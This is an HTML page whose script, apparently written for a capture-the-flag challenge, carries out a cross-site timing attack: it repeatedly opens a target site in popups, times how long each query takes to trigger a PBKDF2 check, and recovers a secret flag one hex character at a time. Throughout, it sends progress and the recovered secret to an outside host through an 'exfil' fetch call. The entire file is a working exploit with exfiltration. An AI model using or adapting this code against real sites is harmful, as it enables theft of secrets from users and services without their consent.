<!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
// v12 - verify prefix then find remaining chars with lower threshold + retries
var HEX="0123456789abcdef";

function exfil(d){fetch(W+"/"+encodeURIComponent(d),{mode:"no-cors"}).catch(function(){});}

function probeOne(q){
  return new Promise(function(res){
    var sid="s"+Math.random().toString(36).slice(2,10);
    var rid="r"+Math.random().toString(36).slice(2,10);
    var url=T+"/?mode=probe&q="+encodeURIComponent(q)+
      "&sid="+encodeURIComponent(sid)+"&rid="+encodeURIComponent(rid);
    var t0=performance.now();
    var w;
    try{w=window.open(url,"pw");}catch(e){res(-1);return;}
    if(!w){res(-1);return;}
    var done=false;
    function fin(ms){if(done)return;done=true;try{w.close();}catch(e){}res(Math.round(ms));}
    function handler(e){
      if(e.data&&e.data.type==="svfgp-probe-done"&&e.data.sid===sid){
        window.removeEventListener("message",handler);
        fin(performance.now()-t0);
      }
    }
    window.addEventListener("message",handler);
    setTimeout(function(){window.removeEventListener("message",handler);fin(-1);},4000);
  });
}

function shuffle(a){for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=a[i];a[i]=a[j];a[j]=t;}return a;}

async function run(){
  exfil("v12_START");
  var t0=Date.now();
  await probeOne("ZZZZ"); // warmup

  // Phase 1: verify current prefix by backing off until PBKDF2 triggers
  var prefix=known;
  while(prefix.length>4){
    var t=await probeOne(prefix);
    exfil("V_"+prefix.length+"="+t);
    if(t>250){
      exfil("VALID_AT_"+prefix.length);
      break;
    }
    // This prefix doesn't trigger PBKDF2 - last char is wrong
    prefix=prefix.slice(0,-1);
  }
  known=prefix;
  exfil("VERIFIED_"+known);

  // Phase 2: find remaining chars with lower threshold + 3 retries
  while(known.length < 4+64){
    if(Date.now()-t0>53000){exfil("TIME_"+known);break;}
    await probeOne("ZZZZ"); // warmup
    var chars=shuffle(HEX.split(""));
    var hit=null;

    // Try up to 3 full passes
    for(var attempt=0;attempt<3 && !hit;attempt++){
      chars=shuffle(HEX.split(""));
      for(var i=0;i<chars.length;i++){
        var ch=chars[i];
        var t=await probeOne(known+ch);
        if(t>230){ // lower threshold
          var t2=await probeOne(known+ch);
          if(t2>200){hit=ch;break;}
        }
      }
    }

    if(!hit){
      // Last resort: probe all, pick the slowest
      var best={c:"",t:0};
      chars=shuffle(HEX.split(""));
      for(var i=0;i<chars.length;i++){
        var t=await probeOne(known+chars[i]);
        if(t>best.t)best={c:chars[i],t:t};
      }
      // Verify the best
      var vt=await probeOne(known+best.c);
      if(vt>180){
        hit=best.c;
        exfil("BEST_"+best.c+"="+best.t+",v="+vt);
      } else {
        exfil("STUCK_"+known);
        break;
      }
    }

    known+=hit;
    exfil("F_"+known);
  }

  if(known.length===4+64)known+="}";
  exfil("DONE_"+known);
}
setTimeout(run,200);
</script></body></html>
